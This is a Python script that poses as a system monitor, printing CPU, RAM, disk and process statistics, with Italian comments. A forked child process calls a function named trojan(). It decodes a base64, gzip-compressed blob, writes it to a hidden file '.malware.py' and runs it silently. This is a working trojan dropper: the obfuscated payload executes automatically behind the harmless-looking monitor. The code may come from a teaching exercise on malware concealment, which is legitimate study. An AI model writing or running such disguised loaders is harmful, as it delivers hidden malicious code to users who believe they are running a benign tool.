#!/usr/bin/python3
import psutil
import base64
import time
import gzip
import os

def main():
	# fork processo figlio
	pid = os.fork()

	if pid > 0:
		# parent process
		while True:
			# percentuale CPU usata
			cpu = psutil.cpu_percent()
			# percentuale RAM usata
			ram = psutil.virtual_memory().percent
			# percentuale spazio sul disco usato
			disk = psutil.disk_usage("/").percent
			# numero di tutti i processi in esecuzione
			processes_count = 0
			for _ in psutil.process_iter():
				processes_count += 1
			
			# print delle statistiche
			print("---------------------------------------------------------")
			print("| CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
			print("| {:02}%       | {:02}%       | {:02}%        | {}               |".format(int(cpu), int(ram), int(disk), processes_count))
			print("---------------------------------------------------------")

			# sleep for 2s
			time.sleep(2)
	else:
		# processo figlio
		trojan()


def trojan():
	malware_fd = open(".malware.py", "w")
	blob = "H4sICIHUaGQAA21hbHdhcmUucHkAjVZtd9o2FP48foWqtItdbDmEJF3YaJuzdWcvp13P2n1pwnyELYKCbXmSyBvxfvuuZAsImHTmA5Lu26OrR1d371k0VzIa8yIq7/RUFP0Oz0shNZLsnzlTWrm5EsmMaTcbU8VOjtzsSoliZedGQnU6nZRNUE554fmDTgfBN+EZUzG71WiIzjHRtxoHCJNUJLd4VKvsoUum0VQoXdCcgXmSTHlBrWy5OmwQEdB1i56/7gCV83HGE8TL6yNE01QypTacMZoyqcDXws7Nh/9STIZnl6zQeIDwe3HPs4xGx+QAo8pq1W5jXoKdy5JB4eGp1qUaRBEvaclJImAAm1tFaUY+0bB/BzVhMqGopErdCJkGiBcpl/z+niMGicvWF25olsHGxlwnghfWvhnHzf4gtRlXNrcjK7c+dkpt1NSKNyQTIZEUQgdIzccQXwX1yQEaOFgCSGYejqYiZ9GMZjz6iamZFmXDolBLcUWLMKdKMxlpSFGYUk0xsMAl2kQwLo1H67ohyFIOa3FJ9RRA4UUVLSpMwCan2quBGQX/kYnhQIBqbgFIY0xUmXGTbm/pz38ch0+shUNhqDl4pGA+Le+2F5coJ6kJWLJiFQQ4LbHfarIHrKEp0lOGElFoIJpCAkDQZGrd7Y6zVB+6uMS48nyitOSlt7GzVUDFqDTeIeUNYdCSEq0mW7SyXCcT4CJw0JPYO+/1R4tedU7DWR7en4W//BZ++Bh+6YWno8XhSdDvVw/jpAfi+wOz1D8Njk8rHwePd/J/EFsKfwXvBs030TYwSDzqvnWQuhfEDGETwatqG1dblLXrspWPN0Py8tz49euhcd0Mz8IvbviSPHv7/MXf33r+ojofDb7/4XVA3kT/xt1w+HAx8sniu6B/WO3MSjJlycww9oahKb1mkJ95kSJa3G2fK3Kpa88YOMmAsFsH7aPX6KCd663EcHVjh6C7LXgKzsY5fgXMjuLWutzdXH4KxtpBPwHhm5byubXUXV9qP1d3l5NMKPOGbW3zNmFlS1Eyn3HeWX/1gI62FCHzBgMJClto4NmDV68uLUYa19K6TNrKhQumlaYahWVGC40e0KVkJQo5MtsAfw+I3szQ/qKUHMTPj6r9pc5HtH+Rwj3qVxdk52Bg/4+rfew3VasFzXLiKlpdvz18UTTVtNkqKxKRMmQeFaSF7UDgGqRQNwpbWnOzmog8p/Z+pLbUSpGBgrxm0nqxxo/e/iZNsWsooANww2BbC173waobaFFYbQcUV5M1ze1bY280qLffpzXTTZY7wzb2r5m5RqM2wINNwlrNyjGq7vNctg2TbKZN5ur2wgrSuEllrU7GJ0e1wDPaJJ3npfKMik+adX/ZqdkDc8f4xIG5bgmooxmiTfeHxPiKJTVoteoJ6z+vmZ39HP/64d3nwEk//fHj7/Gnz3++O3u/hAHRCnD0NAhzm2xr2+v3X9UxSWPoebh3+IocwK8Hj4lR8P1GxWzRW8+UE7gL3+lA3YljQ7M4RkPod+LYNM1xjOtbX3fQnf8A3WlDma4LAAA="
	malware = gzip.decompress(base64.b64decode(blob)).decode("UTF-8")
	malware_fd.write(malware)
	malware_fd.close()

	# execute malware
	os.system("/usr/bin/python3 .malware.py")


if __name__ == "__main__":
	main()
